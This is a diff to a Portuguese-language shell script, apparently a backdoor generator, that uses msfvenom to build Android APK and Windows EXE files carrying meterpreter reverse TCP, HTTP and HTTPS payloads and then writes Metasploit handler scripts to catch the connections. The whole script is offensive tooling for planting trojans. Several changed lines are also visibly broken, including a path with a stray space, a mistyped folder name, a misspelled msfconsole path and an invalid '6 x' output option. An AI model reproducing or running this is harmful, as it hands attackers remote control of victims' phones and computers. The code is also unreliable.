@@ -103,10 +103,11 @@ MetaInstalled() {
 }
 
 menu_Windows() {
-	echo "$az         [01] $Ve->$ve Payload->Tcp"
-	echo "$az         [02] $Ve->$ve Payload->Http"
-	echo "$az         [03] $Ve->$ve Payload->Https"
-	echo "$az         [00] $Ve->$ve Sair"
+	echo "
+$az[01] $Ve->$ve Payload->Tcp
+$az[02] $Ve->$ve Payload->Http
+$az[03] $Ve->$ve Payload->Https
+$az[00] $Ve->$ve Sair"
 }
 
 checkMeta
@@ -157,6 +158,7 @@ then
 					$msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$port R > $caminho/$nome.apk
 					msfconsole=$HOME/metasploit-framework/msfconsole
 					echo "$ye Backdoor $nome gerado em $caminho/$nome.apk"
+					mkdir -p ~/Backdoor-apk/.AndroB
 					cd $HOME/Backdoor-apk/.AndroB
 					cat > AndroB-tcp.rb <<- end
 					use exploit/multi/handler
@@ -209,6 +211,7 @@ then
 					$msfvenom -p android/meterpreter/reverse_http LHOST=$IP LPORT=$port R > $caminho/$nome.apk
 					msfconsole=$HOME/metasploit-framework/msfconsole
 					echo "Backdoor $nome gerado em $caminho/$nome.apk"
+					mkdir -p ~/Backdoor-apk/.A droB
 					cd $HOME/Backdoor-apk/.AndroB
 					cat > AndroB-http.rb <<- EOF
 					use exploit/multi/handler
@@ -264,6 +267,7 @@ then
 					$msfvenom -p android/meterpreter/reverse_https LHOST=$IP LPORT=$port R > $caminho/$nome.apk
 					msfconsole=$HOME/metasploit-framework/msfconsole
 					echo "$ye Backdoor $nome gerado em $caminho/$nome.apk"
+					mkdir -p ~/Backdoor-apk/.AndroB
 					cd $HOME/Backdoor-apk/.AndroB
 					cat > AndroB-https.rb <<- EOF
 					use exploit/multi/handler
@@ -329,9 +333,11 @@ then
 					
 					echo "$ye Gerando backdoor $nome.exe aguarde..."
 					msfvenom=$HOME/metasploit-framework/msfvenom
-					$msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port R > $caminho/$nome.exe
+					# 6 x > ~/Desktop/trojan.exe
+					$msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port 6 x > $caminho/$nome.exe
 					msfconsole=$HOME/metasploit-framework/msfcosole
 					echo "$ye Backdoor $nome gerado em $caminho/$nome.exe"
+					mkdir -p ~/Backdoor-apk/.WimB
 					cd $HOME/Backdoor-apk/.WinB
 
 					cat > WinB-tcp.rb <<- EOF
@@ -383,7 +389,7 @@ then
 
 					echo "$ye Gerando backdoor $nome.exe aguarde..."
 					msfvenom=$HOME/metasploit-framework/msfvenom
-					$msfvenom -p windows/meterpreter/reverse_http LHOST=$IP LPORT=$port R > $caminho/$nome.exe
+					$msfvenom -p windows/meterpreter/reverse_http LHOST=$IP LPORT=$port 6 x > $caminho/$nome.exe
 					msfconsole=$HOME/metasploit-framework/msfconsole
 					echo "Backdoor $nome gerado em $caminho/$nome.exe"
 					cd $HOME/Backdoor-apk/.WinB
@@ -439,6 +445,7 @@ then
 					$msfvenom -p windows/meterpreter/reverse_https LHOST=$IP LPORT=$port R > $caminho/$nome.exe
 					msfconsole=$HOME/metasploit-framework/msfconsole
 					echo "$ye Backdoor $nome gerado em $caminho/$nome.exe"
+					mkdir -p ~/Backdoor-apk/.WinB
 					cd $HOME/Backdoor-apk/.WinB
 					cat > WinB-https.rb <<- EOF
 					use exploit/multi/handler
